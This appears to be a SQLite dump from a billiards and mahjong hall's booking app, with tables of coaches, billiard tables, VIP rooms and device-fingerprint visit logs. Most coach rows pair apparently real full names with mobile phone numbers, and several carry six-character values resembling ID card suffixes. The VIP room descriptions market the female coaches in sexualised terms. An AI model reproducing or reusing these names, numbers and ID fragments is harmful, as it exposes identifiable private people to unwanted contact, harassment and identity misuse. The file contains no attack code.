INSERT INTO coaches VALUES(10037,'50','禾子','陈冠妃','193421','初级',89.0,23,156,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774524710706_9d6ae041.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943343019.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774524748778_7bdbe8b3.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774525315870_9533f61d.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774525501164_2dbc95f4.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-26 19:47:10','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774525354688_a881ad9d.mp4"]',24,'全职','13129256319','早班');
INSERT INTO coaches VALUES(10038,'52','露露','詹小云','270920','初级',89.0,NULL,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451415019_5c67b9a3.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608122294_35dbe0d9.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061955412546.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 18:42:33','[]',15,'全职','15362700631','早班');
INSERT INTO coaches VALUES(10039,'69','六九','黎雪琳','115462','高级',109.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942527102.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608010069_5087759a.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608201110_4b2451a0.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 18:43:42','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608141295_1eef42a9.mp4"]',35,'全职','15016154044','早班');
INSERT INTO coaches VALUES(10040,'999','豆豆','马豆豆',NULL,'初级',109.0,18,20,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774270487079_32d808e7.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773662048138_4f2eaf30.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774945647892_c84a3c64.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775107246428_09794857.jpg"]',NULL,'',0,'2026-03-16 19:44:34','2026-04-02 09:05:17','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774945661974_52b5e8a7.mp4"]',26,'离职','18680174119','早班');
INSERT INTO coaches VALUES(10056,'99','逍遥','肖国香','30782X','女神',129.0,18,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775078965647_3c05aa31.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775079630305_a506632d.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775079057598_5b53a27e.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775080129739_61cbf185.jpg"]',NULL,'爱打麻将',0,'2026-03-17 04:43:32','2026-04-01 21:49:32','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775079144089_202d6c86.mp4","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775079194748_72766100.mp4","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775079322956_76c737d9.mp4"]',7,'全职','15126799708','早班');
INSERT INTO coaches VALUES(10059,'60','诗雨','刘湘',NULL,'高级',109.0,24,162,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/40b00aL9HkKxKvVe.jpg?x-oss-process=image/format,jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774348181125_22fbe93f.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774348227271_98fc30ad.jpg"]',NULL,'会唱歌。会打球',0,'2026-03-17 04:43:32','2026-03-25 22:55:44','[]',17,'全职','17573411899','早班');
INSERT INTO coaches VALUES(10060,'77','7k','李祖怡','301240','中级',99.0,99,180,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774704947500_58aee779.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774704740395_186883cf.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/40b00aL9HkKxKvVe.jpg?x-oss-process=image/format,jpg"]',NULL,'',0,'2026-03-17 04:43:32','2026-03-28 21:36:49','[]',12,'全职','15089992393','早班');
INSERT INTO coaches VALUES(10064,'85','小涵','李涵',NULL,'女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/D24KXM6G3tr3Bb5c.jpg?x-oss-process=image/format,jpg"]',NULL,NULL,0,'2026-03-24 01:22:07','2026-03-24 01:22:07',NULL,17,'全职',NULL,'早班');
INSERT INTO coaches VALUES(10065,'86','多多','徐冉冉',NULL,'女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/40b00aL9HkKxKvVe.jpg?x-oss-process=image/format,jpg"]',NULL,NULL,0,'2026-03-24 01:22:07','2026-03-24 01:22:07',NULL,11,'全职',NULL,'早班');
INSERT INTO coaches VALUES(10066,'32','梦辰','胡莺',NULL,'女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/40b00aL9HkKxKvVe.jpg?x-oss-process=image/format,jpg"]',NULL,'',0,'2026-03-24 01:22:07','2026-04-05 19:50:07','[]',10,'兼职',NULL,'早班');
INSERT INTO coaches VALUES(10069,'66','小晴','刘晴',NULL,'高级',109.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/40b00aL9HkKxKvVe.jpg?x-oss-process=image/format,jpg"]',NULL,'',0,'2026-03-24 01:22:07','2026-04-02 12:16:01','[]',6,'离职',NULL,'早班');
INSERT INTO coaches VALUES(10070,'68','kimi','梁晓林',NULL,'高级',109.0,23,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453302421_327fdb76.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453102235_ce05182b.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453113134_c2101e0a.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453164968_9d18c28b.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453182548_25386f89.jpg"]',NULL,'',0,'2026-03-25 23:36:10','2026-03-25 23:41:53','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774453211470_a95add8b.mp4"]',11,'全职','15323942411','早班');
INSERT INTO coaches VALUES(10072,'88','莲宝','李青莲',NULL,'女神',129.0,22,160,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608707740_34a52e90.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608725967_3656d6dd.jpg"]',NULL,'',0,'2026-03-27 18:46:41','2026-03-27 18:55:26','[]',9,'全职','14750820078','早班');
INSERT INTO coaches VALUES(10073,'26','安娜','梁安琪',NULL,'女神',169.0,18,170,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608600630_991dbb27.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608926274_c415b7ee.jpg"]',NULL,'单颜值这一块，我敢说整个中国，甚至说整个亚洲，我啥也不是。',0,'2026-03-27 18:47:57','2026-03-27 18:55:27','[]',12,'全职','13435743450','早班');
INSERT INTO coaches VALUES(10074,'26','晚晚','周萌',NULL,'女神',129.0,NULL,NULL,'[]',NULL,'',0,'2026-03-31 20:07:01','2026-04-05 15:07:11','[]',8,'全职','18982179135','早班');
INSERT INTO coaches VALUES(10075,'87','寒寒','寒帆',NULL,'高级',109.0,NULL,NULL,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775389292471_93c79d9f.jpg"]',NULL,'',0,'2026-03-31 20:10:47','2026-04-05 19:41:35','[]',10,'全职','19960994972','早班');
INSERT INTO coaches VALUES(10077,'90','MS','梅诗琪',NULL,'女神',129.0,NULL,NULL,'[]',NULL,NULL,0,'2026-04-05 15:14:31','2026-04-05 15:14:31',NULL,5,'全职','13326917850','早班');
INSERT INTO coaches VALUES(10078,'61','小茹','黄靖茹',NULL,'女神',129.0,NULL,NULL,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775389871680_ebb10f93.jpg"]',NULL,'',0,'2026-04-05 15:18:34','2026-04-05 19:51:12','[]',7,'全职','15728487465','早班');
INSERT INTO coaches VALUES(10079,'13','文婷','霍茵婷',NULL,'女神',129.0,NULL,NULL,'[]',NULL,NULL,0,'2026-04-05 15:20:45','2026-04-05 15:20:45',NULL,8,'全职','18664440926','早班');
INSERT INTO coaches VALUES(10080,'70','kiki','黎晓琳',NULL,'中级',99.0,23,160,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775391482937_5fb2e103.jpg"]',NULL,'',0,'2026-04-05 15:28:19','2026-04-05 20:18:08','[]',6,'全职','16676002806','早班');
INSERT INTO coaches VALUES(10082,'57','敏儿','江敏',NULL,'初级',89.0,NULL,NULL,'[]',NULL,NULL,0,'2026-04-05 15:45:31','2026-04-05 15:45:31',NULL,5,'全职','17688127137','早班');
INSERT INTO coaches VALUES(10083,'80','AA','陈嘉玲',NULL,'女神',129.0,NULL,NULL,'[]',NULL,NULL,0,'2026-04-05 19:55:22','2026-04-05 19:55:22',NULL,8,'全职','13144049395','早班');
CREATE TABLE tables (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          area TEXT NOT NULL,
          name TEXT NOT NULL UNIQUE,
          name_pinyin TEXT UNIQUE,
          status TEXT DEFAULT '空闲',
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO tables VALUES(1,'大厅区','普台1','putai1','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(2,'大厅区','普台2','putai2','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(3,'大厅区','普台3','putai3','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(4,'大厅区','普台5','putai5','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(5,'大厅区','普台6','putai6','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(6,'大厅区','普台7','putai7','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(7,'大厅区','普台8','putai8','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(8,'大厅区','普台9','putai9','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(9,'大厅区','普台10','putai10','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(10,'大厅区','普台11','putai11','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(11,'大厅区','普台12','putai12','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(12,'大厅区','普台13','putai13','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(13,'大厅区','普台15','putai15','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(14,'大厅区','普台16','putai16','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(15,'大厅区','普台17','putai17','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(16,'大厅区','普台18','putai18','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(17,'大厅区','普台19','putai19','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(18,'大厅区','普台20','putai20','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(19,'大厅区','普台21','putai21','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(20,'大厅区','普台22','putai22','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(21,'大厅区','普台23','putai23','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(22,'大厅区','普台25','putai25','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(23,'大厅区','普台26','putai26','接待中','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(24,'大厅区','普台27','putai27','接待中','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(25,'大厅区','普台28','putai28','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(26,'TV区','TV台','TVtai','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(27,'包厢区','VIP1','VIP1','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(28,'包厢区','VIP2','VIP2','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(29,'包厢区','VIP3','VIP3','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(30,'包厢区','VIP5','VIP5','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(31,'包厢区','VIP6','VIP6','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(32,'包厢区','VIP7','VIP7','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(33,'包厢区','VIP8','VIP8','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(34,'包厢区','BOSS1','BOSS1','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(35,'包厢区','BOSS2','BOSS2','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(36,'包厢区','BOSS3','BOSS3','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(37,'棋牌区','雀1','que1','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(38,'棋牌区','雀2','que2','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(39,'斯诺克区','斯诺克30','sinuoke30','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
INSERT INTO tables VALUES(40,'斯诺克区','斯诺克31','sinuoke31','空闲','2026-03-14 10:37:56','2026-04-08 01:01:17');
CREATE TABLE vip_rooms (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          name TEXT NOT NULL UNIQUE,
          status TEXT DEFAULT '空闲',
          intro TEXT,
          photos TEXT,
          videos TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO vip_rooms VALUES(1,'VIP1包间','空闲',replace('🎱【VIP1包间】老板们看过来！\n超大空间配专业灯光，一杆清台帅到没朋友！橙色沙发一躺，专业教练举杯陪笑，这排面直接拉满～\n蓝色地毯防滑静音，打球聊天两不误。商务谈单？兄弟聚会？来这儿准没错！\n今晚约吗？😏','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774854557336_28a8b949.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773484861259_86dd5719.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774527270832_e3e7e7c8.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(2,'VIP2江景房','空闲',replace('🌊【VIP2江景房】老板，这才是人生！\n落地窗直面江景，阳光洒在台面上，高挑专业教练弯腰教球，这“风景”比窗外还迷人！😍\n累了坐沙发喝两杯，谈生意聊人生都够味。今晚这局，约吗？','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774854401183_5d68f9c0.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773484906943_a0687d9d.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774854394324_2e80c97c.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774615845206_9b7a41ad.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(3,'VIP3山景至尊','空闲',replace('🏔️【VIP3山景至尊】老板，这排面够大！\n超大空间配落地窗，打球不憋屈！专业教练弯腰指导，这“风景”比窗外还养眼～\n沙发躺平喝两杯，谈单成功率飙升！\n今晚VIP3，等你来“杆”动人心！😏','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773484956043_de1c651f.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774854651568_9a137628.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774854655191_0396358b.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855885320_7697d3ae.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(4,'VIP5私密局','空闲',replace('🤫【VIP5私密局】老板，谈事怕吵？来这！\n超大茶桌摆满酒水，专业教练弯腰教球，这画面太美不敢看～😍\n沙发躺平看电视，输赢都是开心局。\n私密性满分，今晚VIP5，咱们“低调”潇洒！','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485005857_a7e589a9.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855269924_aaaa759e.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855275619_577ce19a.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774620778085_e7f46ec1.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(5,'VIP6豪华大包','空闲',replace('🎱【VIP6豪华大包】老板，这空间够你施展！\n超宽台面随便走位，专业灯光照得你像职业选手～专业教练举杯陪笑，沙发一躺就是大佬范儿！\n电视挂着，输赢都有回放。谈生意？开派对？这排面绝对够！\n今晚VIP6，等你来"杆"翻全场！😎','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485050353_bc82af7e.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855336789_50659259.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855341732_5ec49d62.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855345308_08777382.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855738424_b383e833.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(6,'VIP7派对之王','空闲',replace('🛋️【VIP7派对之王】老板，这沙发能躺一排人！\nL型大沙发配大理石茶几，专业教练陪酒陪聊，打球累了直接"瘫"着～😍\n空间大到能开小型派对，谈单聚会两不误。\n今晚VIP7，让你体验什么叫"躺赢"人生！🎱','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485098161_25e9f3d4.jpg"]','[]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(7,'VIP8江景豪华','空闲',replace('🌊【VIP8江景豪华】老板，这视野绝了！\n落地窗看江景，橙色沙发一躺就是大佬！专业教练弯腰教球，这"风景"比江景还醉人～😍\n茶桌摆好，边喝边聊，谈单打球两不误。\n今晚VIP8，让你体验什么叫"江上杆王"！🎱','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485147433_f1554d0a.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774856051859_0da99940.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(8,'BOSS1 至尊江景','空闲',replace('👑【Boss1 至尊江景】老板，这才是真正的“帝王待遇”！\n这空间大到能开派对！看看这巨型米白沙发，往上一瘫，高挑专业教练举杯陪笑，这感觉简直了～😍\n大理石茶几摆满洋酒，窗外江景做背景，打球只是点缀，享受才是正经事！谈几个亿的大单子，或者带兄弟来狂欢，这排面绝对镇得住场！\n今晚Boss1，等你来“登基”主宰全场！🎱🥂','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485202643_7b30dd6c.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855444453_f24ba076.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855448976_6e097204.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855452552_4af081eb.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774620556694_c5d7dda3.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(9,'BOSS2 影音娱乐王','空闲',replace('👑【Boss2 影音娱乐王】老板，这哪是包间，简直是您的私人行宫！\n看看这巨幕投影加顶级音响，打球累了往超长沙发上一瘫，专业教练递酒陪聊，顺便看个大片，这日子给个神仙都不换～😍\n空间大到能开小型派对，谈几个亿的大单子或者带兄弟狂欢都够排面！\n今晚Boss2，让您体验什么叫“躺着赢”的老板人生！🎱🍿🥂','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485283205_ca61e994.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855534346_8c2bf22b.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855537963_08a93b5f.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774855541564_29e1218f.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774620418797_15fe1c27.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(10,'BOSS3 至尊娱乐舱','空闲',replace('👑【Boss3 至尊娱乐舱】老板，这配置简直是天花板！\n超大空间配巨幕投影，打球累了往米白真皮沙发一躺，专业教练举杯陪聊，这待遇没谁了～😍\n落地窗看江景，大理石茶几摆满洋酒，橙色单人座更是大佬专属。谈几个亿的生意或者带兄弟嗨皮都够排面！\n今晚Boss3，让您体验什么叫“人生赢家”的顶级快乐！🎱🥂','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485415013_aecf056a.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485340149_fb9a4415.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485380686_cfdb4378.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485471484_951ef0a4.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773460018970_bfd09dca.jpg"]','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773487921873_3b7cf2b5.mp4","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774620173708_010185d4.mp4"]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(11,'雀1 江景麻将','空闲',replace('🀄️【雀1江景麻将】老板，手气旺不旺看风景！\n落地窗直面江景，财神爷都爱来串门～高挑专业教练坐对家，这"牌运"能不好吗？😍\n蓝色皮椅坐一天不累，橙色沙发歇脚喝茶。谈生意还是搓麻将，这包间都够排面！\n今晚雀1，等你来"杠"上开花！🎰','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485555745_c1b6ea9d.jpg"]','[]','2026-03-14 11:38:43','2026-04-08 01:01:17');
INSERT INTO vip_rooms VALUES(12,'雀2 私密麻将','空闲',replace('🀄️【雀2私密麻将】老板，这窗帘一拉，谁也别想打扰！\n蓝色皮椅坐得舒服，高挑专业教练坐对家，眼神交流间"牌运"都变好了～😍\n橙色沙发歇脚，财神爷门上保佑。谈事搓麻两不误，私密性满分！\n今晚雀2，等你来"胡"个大的！🎰','\n',char(10)),'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1773485600344_be204225.jpg"]','[]','2026-03-14 11:38:43','2026-04-08 01:01:17');
CREATE TABLE device_visits (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_fp TEXT NOT NULL,
  visit_date TEXT NOT NULL,
  first_visit_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  UNIQUE(device_fp, visit_date)
);
INSERT INTO device_visits VALUES(1,'test_fp_001','2026-03-15','2026-03-15 16:35:55');
INSERT INTO device_visits VALUES(2,'4c9c30b9','2026-03-15','2026-03-15 16:39:47');
INSERT INTO device_visits VALUES(3,'2f0027e7','2026-03-15','2026-03-15 16:41:14');
INSERT INTO device_visits VALUES(4,'7825f5bd','2026-03-15','2026-03-15 17:28:52');
INSERT INTO device_visits VALUES(5,'37e0a115','2026-03-15','2026-03-15 18:01:08');
INSERT INTO device_visits VALUES(6,'3ff2067e','2026-03-15','2026-03-15 18:57:15');
INSERT INTO device_visits VALUES(7,'4f9a3662','2026-03-15','2026-03-15 19:25:36');
INSERT INTO device_visits VALUES(8,'60afa0dd','2026-03-15','2026-03-15 19:35:27');
INSERT INTO device_visits VALUES(9,'7b3a7bd6','2026-03-15','2026-03-15 19:52:48');
INSERT INTO device_visits VALUES(10,'5ff41c76','2026-03-15','2026-03-15 21:50:34');
INSERT INTO device_visits VALUES(11,'275a83c4','2026-03-16','2026-03-16 00:57:07');
INSERT INTO device_visits VALUES(12,'2f0027e7','2026-03-16','2026-03-16 01:24:44');
INSERT INTO device_visits VALUES(13,'36fdac1e','2026-03-16','2026-03-16 01:29:18');
INSERT INTO device_visits VALUES(14,'8da923c','2026-03-16','2026-03-16 02:32:42');
INSERT INTO device_visits VALUES(15,'280ddc46','2026-03-16','2026-03-16 05:15:04');
INSERT INTO device_visits VALUES(16,'2e33535e','2026-03-16','2026-03-16 08:56:53');
INSERT INTO device_visits VALUES(17,'4c9c30b9','2026-03-16','2026-03-16 09:23:23');
INSERT INTO device_visits VALUES(18,'da763cc','2026-03-16','2026-03-16 12:18:32');
INSERT INTO device_visits VALUES(19,'4d62fc07','2026-03-16','2026-03-16 12:25:47');
INSERT INTO device_visits VALUES(20,'2f82a2bb','2026-03-16','2026-03-16 13:23:39');
INSERT INTO device_visits VALUES(21,'4ccd064c','2026-03-16','2026-03-16 13:38:26');
INSERT INTO device_visits VALUES(22,'3074f0a1','2026-03-16','2026-03-16 19:41:38');
INSERT INTO device_visits VALUES(23,'25164561','2026-03-16','2026-03-16 20:26:48');
INSERT INTO device_visits VALUES(24,'275a83c4','2026-03-17','2026-03-17 00:50:45');
INSERT INTO device_visits VALUES(25,'e668d45','2026-03-17','2026-03-17 00:56:54');
INSERT INTO device_visits VALUES(26,'74142ae4','2026-03-17','2026-03-17 01:50:27');
INSERT INTO device_visits VALUES(27,'a1e1d20','2026-03-17','2026-03-17 02:32:57');
INSERT INTO device_visits VALUES(28,'4a7f3c1f','2026-03-17','2026-03-17 02:33:00');
INSERT INTO device_visits VALUES(29,'4c9c30b9','2026-03-17','2026-03-17 03:10:15');
INSERT INTO device_visits VALUES(30,'2f0027e7','2026-03-17','2026-03-17 03:10:37');
INSERT INTO device_visits VALUES(31,'36fdac1e','2026-03-17','2026-03-17 05:19:14');
INSERT INTO device_visits VALUES(32,'a25dd1c','2026-03-17','2026-03-17 05:37:35');
INSERT INTO device_visits VALUES(33,'4d62fc07','2026-03-17','2026-03-17 05:52:55');
INSERT INTO device_visits VALUES(34,'725fea9f','2026-03-17','2026-03-17 08:24:22');
INSERT INTO device_visits VALUES(35,'1d80dbf1','2026-03-17','2026-03-17 09:17:24');
INSERT INTO device_visits VALUES(36,'626c3ff9','2026-03-17','2026-03-17 14:22:11');
INSERT INTO device_visits VALUES(37,'b8a0f38','2026-03-17','2026-03-17 16:02:03');
INSERT INTO device_visits VALUES(38,'25c6de66','2026-03-17','2026-03-17 17:46:02');
INSERT INTO device_visits VALUES(39,'314ab786','2026-03-17','2026-03-17 22:13:15');
INSERT INTO device_visits VALUES(40,'1f044430','2026-03-17','2026-03-17 23:56:59');
INSERT INTO device_visits VALUES(41,'565503da','2026-03-18','2026-03-18 01:58:20');
INSERT INTO device_visits VALUES(42,'64fc124','2026-03-18','2026-03-18 03:07:00');
INSERT INTO device_visits VALUES(43,'749cfc42','2026-03-18','2026-03-18 04:29:44');
INSERT INTO device_visits VALUES(44,'a8123f9','2026-03-18','2026-03-18 04:58:20');
INSERT INTO device_visits VALUES(45,'2f0027e7','2026-03-18','2026-03-18 05:58:36');
INSERT INTO device_visits VALUES(46,'198fb1dc','2026-03-18','2026-03-18 07:29:55');
INSERT INTO device_visits VALUES(47,'78d576dc','2026-03-18','2026-03-18 07:33:51');
INSERT INTO device_visits VALUES(48,'47e3bb3f','2026-03-18','2026-03-18 14:05:08');
INSERT INTO device_visits VALUES(49,'4c9c30b9','2026-03-18','2026-03-18 14:56:32');
